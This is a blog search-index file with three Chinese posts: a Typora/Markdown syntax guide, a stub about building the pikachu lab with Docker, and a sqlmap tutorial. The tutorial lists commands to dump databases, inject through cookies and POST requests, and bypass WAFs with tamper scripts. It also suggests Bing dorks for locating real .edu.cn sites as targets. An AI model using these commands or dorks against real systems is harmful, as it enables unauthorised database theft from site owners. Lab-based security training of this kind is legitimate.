<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>【Typora】typora知识总结</title>
    <url>/posts/287bb156/</url>
    <content><![CDATA[<h2 id="Markdown语法">Markdown语法</h2>
<h3 id="快捷键汇总">快捷键汇总</h3>
<table>
<thead>
<tr>
<th style="text-align:center">功能</th>
<th style="text-align:center">快捷键</th>
<th style="text-align:center">功能</th>
<th style="text-align:center">快捷键</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">加粗</td>
<td style="text-align:center">Ctrl+B</td>
<td style="text-align:center">插入图像</td>
<td style="text-align:center">Ctrl+Shift+I</td>
</tr>
<tr>
<td style="text-align:center">斜体</td>
<td style="text-align:center">Ctrl+I</td>
<td style="text-align:center">删除线</td>
<td style="text-align:center">Alt+Shift+5</td>
</tr>
<tr>
<td style="text-align:center">下划线</td>
<td style="text-align:center">Ctrl+U</td>
<td style="text-align:center">公式块</td>
<td style="text-align:center">Ctrl+Shift+M</td>
</tr>
<tr>
<td style="text-align:center">超链接</td>
<td style="text-align:center">Ctrl+K</td>
<td style="text-align:center">代码块</td>
<td style="text-align:center">Ctrl+Shift+K</td>
</tr>
<tr>
<td style="text-align:center">表格</td>
<td style="text-align:center">Ctrl+T</td>
<td style="text-align:center">代码段</td>
<td style="text-align:center">Ctrl+Shift+`</td>
</tr>
<tr>
<td style="text-align:center">引用</td>
<td style="text-align:center">&gt;+空格</td>
<td style="text-align:center">退出引用</td>
<td style="text-align:center">Shift+Tab</td>
</tr>
<tr>
<td style="text-align:center">段落</td>
<td style="text-align:center">Ctrl+0</td>
<td style="text-align:center">有序列表</td>
<td style="text-align:center">Ctrl+Shift+[</td>
</tr>
<tr>
<td style="text-align:center">标题</td>
<td style="text-align:center">Ctrl+数字</td>
<td style="text-align:center">无序列表</td>
<td style="text-align:center">Ctrl+Shift+]</td>
</tr>
<tr>
<td style="text-align:center">全选</td>
<td style="text-align:center">Ctrl+A</td>
<td style="text-align:center">选中行/句</td>
<td style="text-align:center">Ctrl+L</td>
</tr>
<tr>
<td style="text-align:center">选中段落</td>
<td style="text-align:center">Ctrl+E</td>
<td style="text-align:center">选中当前词</td>
<td style="text-align:center">Ctrl+D</td>
</tr>
<tr>
<td style="text-align:center">跳转所选</td>
<td style="text-align:center">Ctrl+J</td>
<td style="text-align:center">跳转文首/末</td>
<td style="text-align:center">Ctrl+Home/End</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">源代码模式</td>
<td style="text-align:center">Ctrl+/</td>
</tr>
</tbody>
</table>
<span id="more"></span>
<h3 id="段落">段落</h3>
<h4 id="标题">标题</h4>
<p>使用 # 可以表示标题，一级标题对应一个 # ，二级标题对应两个 # 号，最多至六级标题。在Typora中，# 后要紧接着一个空格才能表示标题，否则就是普通字符。</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"># h1   <span class="comment">//一级标题 对应 &lt;h1&gt; &lt;/h1&gt;</span></span><br><span class="line">## h2   <span class="comment">//二级标题 对应 &lt;h2&gt; &lt;/h2&gt;</span></span><br><span class="line">### h3  <span class="comment">//三级标题 对应 &lt;h3&gt; &lt;/h3&gt;</span></span><br><span class="line">#### h4  <span class="comment">//四级标题 对应 &lt;h4&gt; &lt;/h4&gt;</span></span><br><span class="line">##### h5  <span class="comment">//五级标题 对应 &lt;h5&gt; &lt;/h5&gt;</span></span><br><span class="line">###### h6  <span class="comment">//六级标题 对应 &lt;h6&gt; &lt;/h6&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="字体">字体</h4>
<table>
<thead>
<tr>
<th style="text-align:center">格式</th>
<th style="text-align:center">功能</th>
<th style="text-align:center">快捷键</th>
<th style="text-align:center">展示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">*这是斜体*<br>_这是斜体_</td>
<td style="text-align:center">斜体文本</td>
<td style="text-align:center">Ctrl+I</td>
<td style="text-align:center"><em>这是斜体</em></td>
</tr>
<tr>
<td style="text-align:center">**这是粗体**<br>__这是粗体__</td>
<td style="text-align:center">粗体文本</td>
<td style="text-align:center">Crtl+B</td>
<td style="text-align:center"><strong>这是粗体</strong></td>
</tr>
<tr>
<td style="text-align:center">***这是粗斜体***<br>___这是粗斜体___</td>
<td style="text-align:center">粗斜体文本</td>
<td style="text-align:center">无</td>
<td style="text-align:center"><em><strong>这是粗斜体</strong></em></td>
</tr>
</tbody>
</table>
<p>在hexo中，为避免字体样式错误，最好不要让修改字体样式的标识符中紧挨别的字符，或者在两端外添加空格。以如下代码进行示范：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="strong">**你好**</span>。我是全世界最帅的人</span><br><span class="line"><span class="strong">**你好。**</span>我是全世界最帅的人</span><br><span class="line"><span class="strong">**你好。**</span> 我是全世界最帅的人</span><br></pre></td></tr></table></figure>
<p><font class="notice">注：第二行其实没有空格，因为装了auto_spacing，强制加了空格</font></p>
<p><strong>你好</strong>。我是全世界最帅的人</p>
<p>**你好。**我是全世界最帅的人</p>
<p><strong>你好。</strong> 我是全世界最帅的人</p>
<p><font size="2">注：在typora中，并不会造成错误</font></p>
<h4 id="代码">代码</h4>
<p>如果是一行代码，可以使用段内代码块来表示，用一对 <strong>'</strong>（数字1旁边的符号）括住代码。比如<code>printf(&quot;Hello World!&quot;)</code></p>
<p>如果是代码段，那么可以使用<strong>三个 ` 加Enter/空格+编程语言</strong>来表示。如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Hello world!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以在代码块的右下角选择编程语言。</p>
<h4 id="链接-a-id-t1p8-a">链接<a id="t1p8"></a></h4>
<p>我们可以使用链接打开网页，也可以打开本地文件和实现页内跳转。链接的几种使用方式如下：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="selector-attr">[链接文字]</span>(链接地址)</span><br><span class="line"><span class="number">2</span>.&lt;链接地址&gt;</span><br><span class="line"><span class="number">3</span>.<span class="selector-attr">[链接文字]</span><span class="selector-attr">[链接ID]</span></span><br><span class="line">  <span class="selector-attr">[链接ID]</span>:http:<span class="comment">//XXXXXXXX.XXX</span></span><br><span class="line"><span class="number">4</span>.<span class="selector-attr">[链接文字]</span><span class="selector-attr">[]</span></span><br><span class="line">  <span class="selector-attr">[链接文字]</span>:http:<span class="comment">//XXXXXXXX.XXX</span></span><br></pre></td></tr></table></figure>
<p>以下列样例进行演示：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="selector-attr">[百度]</span>(https:<span class="comment">//www.baidu.com/ &quot;百度搜索&quot;)   绝对链接</span></span><br><span class="line"><span class="number">2</span>.&lt;https:<span class="comment">//www.baidu.com/&gt;</span></span><br><span class="line"><span class="number">3</span>.<span class="selector-attr">[About]</span>(/about/ <span class="string">&quot;关于我&quot;</span>)   相对链接</span><br><span class="line"><span class="number">4</span>.<span class="selector-attr">[打开hello-word文档]</span>(../<span class="number">4</span>a17b156 <span class="string">&quot;hello-world&quot;</span>)  相对链接打开文章</span><br><span class="line"><span class="number">5</span>.<span class="selector-attr">[打开002.png照片]</span>(../../images/<span class="number">002</span><span class="selector-class">.png</span> <span class="string">&quot;002.png&quot;</span>)  相对链接打开图片</span><br><span class="line"><span class="number">6</span>.<span class="selector-attr">[My Home]</span><span class="selector-attr">[ID]</span></span><br><span class="line"><span class="selector-attr">[ID]</span>:https:<span class="comment">//www.mcorazon.top &quot;我的博客主页&quot;</span></span><br><span class="line"><span class="number">7</span>.<span class="selector-attr">[My Home]</span><span class="selector-attr">[]</span></span><br><span class="line"><span class="selector-attr">[My Home]</span>:https:<span class="comment">//www.mcorazon.top &quot;我的博客主页&quot;</span></span><br><span class="line"><span class="number">8</span>.<span class="selector-attr">[跳转到此小节首]</span>(#t1p8）</span><br></pre></td></tr></table></figure>
<p><font size="2"><em>注：1. 引号部分表示title，可以省略。样式2不可加title<br>2. 不能使用<code>&lt;  &gt;</code>跳转本地文件，如&lt;../../images/002.png&gt; ，其并不会表示为可连接状态<br>3.同时，使用第八个样例时需要添加锚点，在1.8的标题后添加了<code>&lt;a id=&quot;t1p8&quot;&gt;&lt;/a&gt;</code></em></font></p>
<p>以上代码的结果如下：</p>
<p>1.<a href="https://www.baidu.com/" title="百度搜索">百度</a>      绝对链接<br>
2.&lt;<a href="https://www.baidu.com/">https://www.baidu.com/</a> &gt;<br>
3.<a href="/about/" title="关于我">About</a>       相对链接<br>
4.<a href="../4a17b156" title="hello-world">打开hello-word文档</a>      相对链接打开文章<br>
5.<a href="../../images/002.png" title="002.png">打开002.png照片</a>      相对链接打开图片<br>
6.<a href="https://www.mcorazon.top" title="我的博客主页">My Home</a>     我的博客主页</p>
<p>7.<a href="https://www.mcorazon.top" title="我的博客主页">My Home</a>     我的博客主页</p>
<p>8.<a href="#t1p8">跳转到此小节首</a></p>
<h4 id="上标下标">上标下标</h4>
<p>上下标可以使用<code>^X^</code>，<code>~X~</code>来实现。如：</p>
<p>上标：a<sup>X</sup>，下标：a<sub>X</sub></p>
<p><s>如果作为上标、下标的符号不止一个，则需要用花括号{}将其括起来。如：</s></p>
<p><s>上 标 为 12 ： a 12 , 下 标 为 34 ： a 34 上标为12：a<sup>{12},下标为34：a~{34</sup>2^}~ 上标为12：a<sup>12</sup>,下标为34：a34</s></p>
<h4 id="特殊符号">特殊符号</h4>
<ul class="lvl-0">
<li class="lvl-2">
<p>（1）对于 Markdown 中的语法符号，前面加反斜线\即可显示符号本身。</p>
</li>
<li class="lvl-2">
<p>（2）其他特殊字符使用Unicode码表示，示例如下：</p>
<p><img src="/posts/287bb156//image-20241110173249216.png" alt="image-20241110173249216"></p>
</li>
</ul>
<h3 id="其他">其他</h3>
<h4 id="各种线">各种线</h4>
<p>你可以在一行中用三个以上的星号(*)、减号(-)、底线(_)来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="string">***</span></span><br><span class="line"><span class="string">___</span></span><br></pre></td></tr></table></figure>
<hr>
<hr>
<hr>
<h4 id="列表">列表</h4>
<ol>
<li class="lvl-3">
<p><strong>无序列表</strong></p>
</li>
</ol>
<p>使用*，+或-标记符号加空格来表示无需列表项，示例如下</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">*</span> 第一项</span><br><span class="line"><span class="bullet">*</span> 第二项</span><br><span class="line"><span class="bullet">+</span> 第一项</span><br><span class="line"><span class="bullet">+</span> 第二项</span><br><span class="line"><span class="bullet">-</span> 第一项</span><br><span class="line"><span class="bullet">-</span> 第二项</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>第一项</p>
</li>
<li class="lvl-2">
<p>第二项</p>
</li>
</ul>
<ul class="lvl-0">
<li class="lvl-2">
<p>第一项</p>
</li>
<li class="lvl-2">
<p>第二项</p>
</li>
</ul>
<ul class="lvl-0">
<li class="lvl-2">
<p>第一项</p>
</li>
<li class="lvl-2">
<p>第二项</p>
</li>
</ul>
<ol start="2">
<li class="lvl-3">
<p><strong>有序列表</strong></p>
</li>
</ol>
<p>使用数字加.再加空格来表示有序列表，其中，数字并不重要。示例如下：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> 第一项</span><br><span class="line"><span class="bullet">3.</span> 第二项</span><br><span class="line"><span class="bullet">10.</span> 第三项</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>第一项</p>
</li>
<li class="lvl-3">
<p>第二项</p>
</li>
<li class="lvl-3">
<p>第三项</p>
</li>
<li class="lvl-3">
<p><strong>嵌套列表</strong></p>
</li>
</ol>
<p>首先使用<code>*</code>、<code>+</code>或<code>-</code>进入列表，然后回车换行，会发现系统自动生成列表第二项，此时按下<strong>Tab</strong>键，列表第二项变为第一项的子列表。<strong>按回车退出当前列表</strong>。可以在无序列表中嵌套有序列表。</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> 1. 一</span><br><span class="line"><span class="bullet">   1.</span> 一.一</span><br><span class="line"><span class="bullet">      1.</span> 一.一.一</span><br><span class="line"><span class="bullet">      2.</span> 一.一.二</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>一</p>
<ol>
<li class="lvl-6">
<p>一.一</p>
<ol>
<li class="lvl-9">一.一.一</li>
<li class="lvl-9">一.一.二</li>
</ol>
</li>
<li class="lvl-6">
<p>一.二</p>
<ol>
<li class="lvl-9">一.二.一</li>
<li class="lvl-9">一.二.二</li>
</ol>
</li>
</ol>
</li>
</ol>
<h4 id="区块">区块</h4>
<p>可以使用<code>&gt;</code>加空格来表示区块。</p>
<p>当我们想要引用别人的文章内容或者需要对文字进行强调时，可以将其放在区块内。</p>
<blockquote>
<p>这是区块</p>
<p>区块也可以嵌套</p>
<blockquote>
<p>​	这是二级区块</p>
<blockquote>
<p>这是三级区块</p>
</blockquote>
</blockquote>
</blockquote>
<h4 id="图片">图片</h4>
<p><strong>引用图片和链接的唯一区别就是在最前方添加一个感叹号。</strong> 插入图片的语法如下：</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">!<span class="selector-attr">[alt 属性文本]</span>(图片地址)</span><br><span class="line">!<span class="selector-attr">[alt 属性文本]</span>(图片地址 &quot;可选标题&quot;)</span><br></pre></td></tr></table></figure>
<p>示例如下：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. !<span class="selector-attr">[绝对路径引用]</span>(/images/<span class="number">002</span><span class="selector-class">.png</span> <span class="string">&quot;绝对路径引用&quot;</span> =<span class="number">200</span>*<span class="number">200</span>)</span><br><span class="line"><span class="number">2</span>. !<span class="selector-attr">[相对路径引用]</span>(【Hexo】typora知识总结/<span class="number">001</span><span class="selector-class">.jpg</span> <span class="string">&quot;相对路径引用1&quot;</span>)</span><br><span class="line"><span class="number">3</span>. !<span class="selector-attr">[相对路径引用]</span>(<span class="number">001</span><span class="selector-class">.jpg</span> <span class="string">&quot;相对路径引用2&quot;</span>)</span><br><span class="line"><span class="number">4</span>. !<span class="selector-attr">[网络图片]</span>（https:<span class="comment">//www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png &quot;Baidu&quot;)</span></span><br></pre></td></tr></table></figure>
<p>由于使用插件markdown-it-imsize控制了图片大小，此图片在 typora 中无法显示↓</p>
<p><img src="/posts/287bb156//002.png" alt="本地png图片" title="绝对路径引用" width="200" height="200"></p>
<p><img src="/posts/287bb156//001.jpg" alt="相对路径引用" title="相对路径引用1"></p>
<p>由于使用了post_asset_folder，此图片在 typora 中无法显示↓</p>
<p><img src="/posts/287bb156//001.jpg" alt="相对路径引用" title="相对路径引用2"></p>
<p><img src="/posts/287bb156//PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png" alt="网络图片" title="Baidu"></p>
<p><font class="notice">注：因为我的 typora 使用了图片自动下载功能，会强制改为本地图片，因此此处已经自动下载到了本地，并且依然使用的本地图片。</font></p>
<p>在实际的使用过程中，虽然第三种方法最为方便，但是由于第三种方法图片不能在 typora 中显示，因此我采用了第二种方法来编写博客。其次由于我使用了 hexo 插件 abbrlink ，需要在主题配置文件中\node_modules\hexo-asset-image\index.js进行更改。</p>
<h4 id="表格">表格</h4>
<p>Markdown 制作表格使用 <code>|</code> 来分隔不同的单元格，使用 <code>-</code> 来分隔表头和其他行。<code>:-</code>表示左对齐<code>-:</code>表示右对齐<code>:-:</code>表示中间对齐。示例如下：</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">|<span class="string">左对齐</span>|<span class="string">右对齐</span>|<span class="string">中间对齐</span>|</span><br><span class="line">|<span class="string">:---</span>|<span class="string">---:</span>|<span class="string">:----:</span>|</span><br><span class="line">|<span class="string">单元格</span>|<span class="string">单元格</span>|<span class="string">单元格</span>|</span><br><span class="line">|<span class="string">单元格</span>|<span class="string">单元格</span>|<span class="string">单元格</span>|</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">左对齐</th>
<th style="text-align:right">右对齐</th>
<th style="text-align:center">中间对齐</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">单元格</td>
<td style="text-align:right">单元格</td>
<td style="text-align:center">单元格</td>
</tr>
<tr>
<td style="text-align:left">单元格</td>
<td style="text-align:right">单元格</td>
<td style="text-align:center">单元格</td>
</tr>
</tbody>
</table>
<p>在Typora中，我们可以使用快捷键<strong>Ctrl+T</strong>来插入表格，并选择行列，当选中表格某一单元格时，可以在表格左上角手动设置对齐方式，右上角选择更多操作。</p>
<p><img src="/posts/287bb156//image-20241028100647549.png" alt="image-20241028100647549"></p>
<h4 id="数学公式">数学公式</h4>
<p>在Typora中，有两种方法插入数学公式，示例如下：</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">第一种方法：<span class="symbol">$</span><span class="number">1</span>+<span class="number">2</span>=<span class="number">3</span><span class="symbol">$</span></span><br><span class="line">第二种方法：</span><br><span class="line"><span class="symbol">$</span><span class="symbol">$</span></span><br><span class="line"><span class="number">1</span>+<span class="number">2</span>=<span class="number">3</span></span><br><span class="line"><span class="symbol">$</span><span class="symbol">$</span></span><br></pre></td></tr></table></figure>
<p>第一种方法：$1+2=3$</p>
<p>第二种方法：<br>
$$<br>
1+2=3<br>
$$</p>
<h2 id="三、Typora与HTML">三、Typora与HTML</h2>
<h3 id="3-1-改变字体颜色及大小">3.1 改变字体颜色及大小</h3>
<p>我们可以使用<code>&lt;font&gt; &lt;/font&gt;</code>标签来改变字体的颜色及大小，如：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;font <span class="attribute">size</span>=3 <span class="attribute">color</span>=<span class="string">&quot;red&quot;</span>&gt;字体颜色为红色，大小为3&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">&lt;font <span class="attribute">size</span>=4 <span class="attribute">color</span>=<span class="string">&quot;blue&quot;</span>&gt;字体颜色为蓝色，大小为4&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">&lt;font <span class="attribute">size</span>=6 <span class="attribute">color</span>=<span class="string">&quot;#ffffff&quot;</span>&gt;字体颜色为紫罗兰，大小为6&lt;/font&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><font size="3" color="red">字体颜色为红色，大小为3</font></p>
<p><font size="4" color="blue">字体颜色为蓝色，大小为4</font></p>
<p><font size="6" color="#ffffff">字体颜色为紫罗兰，大小为6</font></p>
<h3 id="3-2-改变对齐方式">3.2 改变对齐方式</h3>
<p>我们可以改变字体的对齐方式，用标签<code>&lt;p&gt; &lt;/p&gt;</code>加上属性<code>align</code>，如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&quot;left&quot;</span>&gt;</span>左对齐<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span>中间对齐<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>右对齐<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p align="left">左对齐</p>
<p align="center">中间对齐</p>
<p align="right">右对齐</p>
<h3 id="3-3-插入头像">3.3 插入头像</h3>
<p>我们可以通过标签<code>&lt;img src=url /&gt;</code>来插入图片，如：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="string">&quot;./【Hexo】typora知识总结/001.jpg&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>
<img src="/posts/287bb156//001.jpg">
<p>我们可以改变<code>&lt;img&gt;</code>标签的属性，来改变图片的大小。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;./【Hexo】typora知识总结/001.jpg&quot;</span> <span class="attribute">width</span>=100 <span class="attribute">height</span>=100/&gt;</span><br></pre></td></tr></table></figure>
<img src="/posts/287bb156//001.jpg" width="100" height="100/">
<p>也可以改变图片的位置，如：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;【Hexo】typora知识总结/001.jpg&quot;</span> <span class="attribute">width</span>=30 <span class="attribute">height</span>=30 <span class="attribute">style</span>=<span class="string">&quot;float:left&quot;</span>/&gt;图片在左边</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;【Hexo】typora知识总结/001.jpg&quot;</span> <span class="attribute">width</span>=30 <span class="attribute">height</span>=30 <span class="attribute">style</span>=<span class="string">&quot;float:right&quot;</span>/&gt;图片在右边</span><br></pre></td></tr></table></figure>
<p><img src="/posts/287bb156//001.jpg" width="30" height="30" style="float:left">图片在左边<img src="/posts/287bb156//001.jpg" width="30" height="30" style="float:right">图片在右边</p>
<h2 id="四、其他用法">四、其他用法</h2>
<h3 id="文章截断——阅读全文">文章截断——阅读全文</h3>
<p>若你是用的是NEXT主题，可以在文章中使用<code>&lt; !--more--&gt;</code> 手动进行截断这种方法可以根据文章的内容，自己在合适的位置添加 <code>&lt; !--more--&gt;</code> 标签，使用灵活，也是Hexo推荐的方法。</p>
<h3 id="目录功能">目录功能</h3>
<p>使用hexo-toc可以在文章头部添加目录。 其配置在博客根目录的_config.yml文件中。类似于文章截断功能，在需要显示文章目录的地方添加<code>&lt;!--toc--&gt;</code></p>
<p>额······因为使用这个以后侧边框的目录无法跳转，就又卸载了。</p>
<p>本文参考：</p>
<p><a href="https://blog.csdn.net/weixin_30745641/article/details/95686757">Hexo中添加emoji表情</a></p>
<p><a href="https://www.imczw.com/post/tech/hexo-next-tags-markdown.html"> Hexo-Next 常用 MD 语法合集</a></p>
<p><a href="https://blog.csdn.net/qq_41261251/article/details/102817673">https://blog.csdn.net/qq_41261251/article/details/102817673</a></p>
<p><a href="https://whatsid.me/2019/08/21/hexo-markdown-syntax/#">https://whatsid.me/2019/08/21/hexo-markdown-syntax/#</a></p>
<p><a href="https://blog.csdn.net/lewky_liu/article/details/82432003">Hexo系列(2) - NexT主题美化与博客功能增强</a></p>
<p><a href="https://theme-next.iissnan.com/theme-settings.html">主题配置 - NexT 使用文档</a></p>
<p><a href="https://blog.csdn.net/qq_32320399/article/details/99823695">Markdown连接的写法</a></p>
]]></content>
      <categories>
        <category>博客写作</category>
      </categories>
  </entry>
  <entry>
    <title>【pikachu靶场】docker搭建pikachu靶场</title>
    <url>/posts/712580ba/</url>
    <content><![CDATA[<p>pikachu靶场的搭建其实是比较简单的，但是我在使用docker搭建pikachu靶场的时候遇到了几个问题，使我有了一些感悟，因此特意写篇博客记录一下。</p>
<p>因为我已经在服务器上搭好了pikachu靶场，所以这里我用CentOS 7在虚拟机再复现一次。</p>
<p>本文参考：</p>
]]></content>
  </entry>
  <entry>
    <title>【安全工具】sqlmap</title>
    <url>/posts/23b5c41a/</url>
    <content><![CDATA[<h2 id="所有命令">所有命令</h2>
<p><img src="/posts/23b5c41a//image-20250316160541099.png" alt="image-20250316160541099"></p>
<p>SQLmap是一款「自动化」<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&amp;spm=1001.2101.3001.7020">SQL注入</a>工具，kali自带。路径 /usr/share/sqlmap</p>
<p>打开终端，输入<code>sqlmap</code>，出现以下界面，就说明SQLmap「可用」。</p>
<p><img src="/posts/23b5c41a//3323630f970599810ae0f763b683dfe5.png" alt="在这里插入图片描述"></p>
<p>本篇文章使用本地搭建的SQL-labs靶场作为「演示」目标，其他目标可使用必应搜索以下类型的网站：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">inurl:news.asp?<span class="built_in">id</span>=site:edu.cn</span><br><span class="line">inurl:news.php?<span class="built_in">id</span>= site:edu.cn</span><br><span class="line">inurl:news.aspx?<span class="built_in">id</span>=site:edu.cn</span><br></pre></td></tr></table></figure>
<p><img src="/posts/23b5c41a//f8c3e9690521f33f60d6a89532b65714.png" alt="在这里插入图片描述"></p>
<h2 id="快速入门">快速入门</h2>
<p><strong>SQLmap（常规）使用步骤</strong></p>
<p>1、检测「注入点」</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span></span><br></pre></td></tr></table></figure>
<p>2、查看所有「数据库」</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --dbs</span><br></pre></td></tr></table></figure>
<p>3、查看当前使用的数据库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --current-db</span><br></pre></td></tr></table></figure>
<p>4、查看「数据表」</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
<p>5、查看「字段」</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
<p>6、查看「数据」</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --dump</span><br></pre></td></tr></table></figure>
<h2 id="检测目标">检测目标</h2>
<p>检测「注入点」前，需要指定需要检测的「对象」。</p>
<h3 id="指定url">指定url</h3>
<p><code>-u</code> 参数，指定需要检测的url，单/双引号包裹。中间如果有提示，就输入y。</p>
<p>提示：SQLmap不能直接「扫描」网站漏洞，先用其他扫描工具扫出注入点，再用SQLmap验证并「利用」注入点。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27;</span><br></pre></td></tr></table></figure>
<p>扫描完成后，告诉我们存在的注入类型和使用的数据库及版本。</p>
<p><img src="/posts/23b5c41a//image-20250316162233436.png" alt="image-20250316162233436"></p>
<h3 id="指定文件（批量检测）">指定文件（批量检测）</h3>
<p>准备一个「文件」，写上需要检测的多个url，一行一个。</p>
<p><code>-m</code> 指定文件，可以「批量扫描」文件中的url，需要确认就按y。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -m urls.txt</span><br></pre></td></tr></table></figure>
<h3 id="指定数据库-表-字段">指定数据库/表/字段</h3>
<p><code>-D</code> 指定目标「数据库」，单/双引号包裹，常配合其他参数使用。</p>
<p><code>-T</code> 指定目标「表」，单/双引号包裹，常配合其他参数使用。</p>
<p><code>-C</code> 指定目标「字段」，单/双引号包裹，常配合其他参数使用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> -C <span class="string">&#x27;username&#x27;</span> --dump</span><br></pre></td></tr></table></figure>
<h3 id="post请求">post请求</h3>
<p>检测「post请求」的注入点，使用BP等工具「抓包」，将http请求内容保存到txt文件中。</p>
<p><code>-r</code> 指定需要检测的文件，SQLmap会通过post请求方式检测目标。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r bp.txt</span><br></pre></td></tr></table></figure>
<h3 id="cookie注入">cookie注入</h3>
<p><code>--cookie</code> 指定cookie的值，单/双引号包裹。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://xx?id=x&quot;</span> --cookie <span class="string">&#x27;cookie&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="WAF绕过">WAF绕过</h3>
<p><code>--tamper</code> 指定绕过脚本，绕过WAF或ids等。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --tamper <span class="string">&#x27;space2comment.py&#x27;</span></span><br></pre></td></tr></table></figure>
<p>SQLmap内置了很多绕过脚本，在 /usr/share/sqlmap/tamper/ 目录下：</p>
<p><img src="/posts/23b5c41a//image-20250316163642927.png" alt="image-20250316163642927"></p>
<p>脚本按照用途命名，比如 <a href="http://space2comment.py">space2comment.py</a> 是指，用/**/代替空格。</p>
<p>当然，你也可以根据内置脚本格式，自己定义绕过脚本。</p>
<h3 id="其他">其他</h3>
<p><code>--batch</code> （默认确认）不再询问是否确认。</p>
<p><code>--level 1</code> 执行测试的等级（1-5，默认为1，常用3）</p>
<p><code>--method=GET</code> 指定请求方式（GET/POST）</p>
<p><code>--random-agent</code> 随机切换UA（User-Agent）</p>
<p><code>--user-agent ' '</code> 使用自定义的UA（User-Agent）</p>
<p><code>--referer ' '</code> 使用自定义的 referer</p>
